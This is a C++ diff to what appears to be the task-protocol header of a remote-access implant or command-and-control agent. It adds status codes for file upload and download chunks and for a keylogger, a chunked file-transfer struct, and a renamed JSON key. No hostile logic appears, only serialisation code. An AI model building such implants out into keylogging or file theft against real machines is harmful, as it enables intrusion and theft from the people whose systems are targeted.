@@ -51,6 +51,11 @@
 #define RUNNING 5
 #define MORE_TO_FOLLOW 6
 #define NO_MORE_TO_FOLLOW 7
+#define UPLOAD_CHUNK 8
+#define UPLOAD_FINAL 9
+#define DOWNLOAD_CHUNK_STATUS 10
+#define DOWNLOAD_FINAL 11
+#define KEYLOGGER_STATUS 12
 
 template <typename T>
 struct TaskResponse
@@ -72,7 +77,7 @@ struct TaskResponse
         doc.AddMember("TaskType", type, allocator);
         doc.AddMember("TaskCode", code, allocator);
         doc.AddMember("taskCode", code, allocator);
-        doc.AddMember("Status", status, allocator);
+        doc.AddMember("status", status, allocator);
         doc.AddMember("Data", data.ToJsonValue(allocator), allocator);
 
         rapidjson::StringBuffer buffer;
@@ -92,7 +97,7 @@ struct TaskResponse
         objValue.AddMember("TaskID", taskID, allocator);
         objValue.AddMember("TaskType", type, allocator);
         objValue.AddMember("TaskCode", code, allocator);
-        objValue.AddMember("Status", status, allocator);
+        objValue.AddMember("status", status, allocator);
         objValue.AddMember("Data", data.ToJsonValue(allocator), allocator);
 
         return objValue;
@@ -179,6 +184,27 @@ struct TaskSuccess
     }
 };
 
+struct TaskFileChunk
+{
+    std::string fileName;
+    std::string data;
+    std::int64_t offset;
+    std::int64_t totalBytes;
+    bool final;
+
+    rapidjson::Value ToJsonValue(
+        rapidjson::Document::AllocatorType& allocator) const
+    {
+        rapidjson::Value obj(rapidjson::kObjectType);
+        obj.AddMember("FileName", rapidjson::Value(fileName.c_str(), allocator), allocator);
+        obj.AddMember("Data", rapidjson::Value(data.c_str(), allocator), allocator);
+        obj.AddMember("Offset", offset, allocator);
+        obj.AddMember("TotalBytes", totalBytes, allocator);
+        obj.AddMember("Final", final, allocator);
+        return obj;
+    }
+};
+
 struct TaskError
 {
     int code;
@@ -212,7 +238,7 @@ using Request = std::variant<
     TaskRequest<CommandWinTask>,    
     TaskRequest<CommandNetAsm>, 
     TaskRequest<bool>>;
-using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
+using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskFileChunk>, TaskResponse<TaskError>>;
 
 inline std::string CreateResponseTaskValue(
     const std::deque<Response>& tasks)
